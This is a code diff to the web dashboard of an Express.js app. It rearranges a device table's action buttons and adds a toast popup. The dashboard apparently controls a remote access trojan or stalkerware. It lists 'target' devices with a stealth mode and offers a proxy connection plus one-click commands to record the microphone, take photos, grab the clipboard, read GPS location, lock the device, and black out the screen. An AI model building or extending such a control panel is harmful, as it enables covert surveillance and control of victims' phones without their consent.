@@ -486,15 +486,17 @@ app.get('/', (req, res) => {
                 <td style="vertical-align: middle;">${d.stealth ? '<span style="color:var(--neon-orange)">STEALTH</span>' : '<span style="color:var(--neon-green)">NORMAL</span>'}</td>
                 <td style="font-size: 0.72rem; color: #aaa; vertical-align: middle;">${formatTime(d.lastSeen)}</td>
                 <td style="vertical-align: middle; white-space: nowrap;">
-                    <div style="display: inline-flex; align-items: center; gap: 4px; flex-wrap: wrap;">
-                        <a href="/proxy/?deviceId=${encodeURIComponent(d.deviceId)}" style="background: var(--neon-cyan); color: #000; padding: 4px 8px; border-radius: 4px; text-decoration: none; font-weight: bold; font-size: 0.6rem; display: inline-block;">CONNECT</a>
-                        <button onclick="dispatchQuickCommand('${d.deviceId}', 'blackout')" class="btn btn-small" style="${blackoutStyle} padding: 4px 6px; font-size: 0.58rem; margin: 0; border-radius: 4px; cursor: pointer; font-weight: bold;">🕶️ BLACKOUT: ${d.blackout ? 'ON' : 'OFF'}</button>
-                        <button onclick="dispatchQuickCommand('${d.deviceId}', 'lock')" class="btn btn-small" style="${lockStyle} padding: 4px 6px; font-size: 0.58rem; margin: 0; border-radius: 4px; cursor: pointer; font-weight: bold;">🔒 LOCK: ${d.locked ? 'ON' : 'OFF'}</button>
-                        <button onclick="dispatchQuickCommand('${d.deviceId}', 'flashlight')" class="btn btn-small" style="${lightStyle} padding: 4px 6px; font-size: 0.58rem; margin: 0; border-radius: 4px; cursor: pointer; font-weight: bold;">🔦 LIGHT: ${d.flashlight ? 'ON' : 'OFF'}</button>
-                        <button onclick="dispatchQuickCommand('${d.deviceId}', 'mic')" class="btn btn-small" style="background: rgba(0,242,255,0.05); color: var(--neon-cyan); border-color: rgba(0,242,255,0.3); padding: 4px 6px; font-size: 0.58rem; margin: 0; border-radius: 4px; cursor: pointer;">🎙️ MIC</button>
-                        <button onclick="dispatchQuickCommand('${d.deviceId}', 'photo')" class="btn btn-small" style="background: rgba(0,242,255,0.05); color: var(--neon-cyan); border-color: rgba(0,242,255,0.3); padding: 4px 6px; font-size: 0.58rem; margin: 0; border-radius: 4px; cursor: pointer;">📷 PHOTO</button>
-                        <button onclick="dispatchQuickCommand('${d.deviceId}', 'clipboard')" class="btn btn-small" style="background: rgba(0,242,255,0.05); color: var(--neon-cyan); border-color: rgba(0,242,255,0.3); padding: 4px 6px; font-size: 0.58rem; margin: 0; border-radius: 4px; cursor: pointer;">📋 CLIP</button>
-                        <button onclick="dispatchQuickCommand('${d.deviceId}', 'gps')" class="btn btn-small" style="background: rgba(0,242,255,0.05); color: var(--neon-cyan); border-color: rgba(0,242,255,0.3); padding: 4px 6px; font-size: 0.58rem; margin: 0; border-radius: 4px; cursor: pointer;">🛰️ GPS</button>
+                    <a href="/proxy/?deviceId=${encodeURIComponent(d.deviceId)}" style="background: var(--neon-cyan); color: #000; padding: 5px 10px; border-radius: 6px; text-decoration: none; font-weight: bold; font-size: 0.65rem; display: inline-block;">CONNECT</a>
+                </td>
+                <td style="vertical-align: middle;">
+                    <div style="display: grid; grid-template-columns: repeat(4, auto); gap: 4px; align-items: center;">
+                        <button onclick="dispatchQuickCommand('${d.deviceId}', 'blackout')" class="btn btn-small" style="${blackoutStyle} padding: 4px 6px; font-size: 0.58rem; margin: 0; border-radius: 4px; cursor: pointer; font-weight: bold; white-space: nowrap;">🕶️ BLACKOUT: ${d.blackout ? 'ON' : 'OFF'}</button>
+                        <button onclick="dispatchQuickCommand('${d.deviceId}', 'lock')" class="btn btn-small" style="${lockStyle} padding: 4px 6px; font-size: 0.58rem; margin: 0; border-radius: 4px; cursor: pointer; font-weight: bold; white-space: nowrap;">🔒 LOCK: ${d.locked ? 'ON' : 'OFF'}</button>
+                        <button onclick="dispatchQuickCommand('${d.deviceId}', 'flashlight')" class="btn btn-small" style="${lightStyle} padding: 4px 6px; font-size: 0.58rem; margin: 0; border-radius: 4px; cursor: pointer; font-weight: bold; white-space: nowrap;">🔦 LIGHT: ${d.flashlight ? 'ON' : 'OFF'}</button>
+                        <button onclick="dispatchQuickCommand('${d.deviceId}', 'mic')" class="btn btn-small" style="background: rgba(0,242,255,0.05); color: var(--neon-cyan); border-color: rgba(0,242,255,0.3); padding: 4px 6px; font-size: 0.58rem; margin: 0; border-radius: 4px; cursor: pointer; white-space: nowrap;">🎙️ MIC</button>
+                        <button onclick="dispatchQuickCommand('${d.deviceId}', 'photo')" class="btn btn-small" style="background: rgba(0,242,255,0.05); color: var(--neon-cyan); border-color: rgba(0,242,255,0.3); padding: 4px 6px; font-size: 0.58rem; margin: 0; border-radius: 4px; cursor: pointer; white-space: nowrap;">📷 PHOTO</button>
+                        <button onclick="dispatchQuickCommand('${d.deviceId}', 'clipboard')" class="btn btn-small" style="background: rgba(0,242,255,0.05); color: var(--neon-cyan); border-color: rgba(0,242,255,0.3); padding: 4px 6px; font-size: 0.58rem; margin: 0; border-radius: 4px; cursor: pointer; white-space: nowrap;">📋 CLIP</button>
+                        <button onclick="dispatchQuickCommand('${d.deviceId}', 'gps')" class="btn btn-small" style="background: rgba(0,242,255,0.05); color: var(--neon-cyan); border-color: rgba(0,242,255,0.3); padding: 4px 6px; font-size: 0.58rem; margin: 0; border-radius: 4px; cursor: pointer; white-space: nowrap;">🛰️ GPS</button>
                     </div>
                 </td>
             </tr>
@@ -607,6 +609,21 @@ app.get('/', (req, res) => {
         </div>
     </div>
     <script>
+    function showToast(e, t = "info") {
+      let a = document.getElementById("toast-container");
+      if (!a) {
+        a = document.createElement("div");
+        a.id = "toast-container";
+        a.style.cssText = "position: fixed; bottom: 20px; right: 20px; z-index: 999999; display: flex; flex-direction: column; gap: 10px;";
+        document.body.appendChild(a);
+      }
+      const o = document.createElement("div");
+      o.style.cssText = `background: ${t === "error" ? "rgba(255,49,49,0.9)" : "rgba(0,242,255,0.9)"}; color: #000; padding: 12px 20px; border-radius: 8px; font-family: 'Orbitron', sans-serif; font-size: 0.75rem; font-weight: bold; box-shadow: 0 0 20px ${t === "error" ? "rgba(255,49,49,0.5)" : "rgba(0,242,255,0.5)"}; backdrop-filter: blur(5px); transition: opacity 0.3s;`;
+      o.innerText = e;
+      a.appendChild(o);
+      setTimeout(() => { o.style.opacity = "0"; setTimeout(() => o.remove(), 300); }, 3000);
+    }
+
     function renameDevice(deviceId, currentAlias) {
         const newName = prompt('Enter custom name/alias for target device:', currentAlias || '');
         if (newName !== null) {
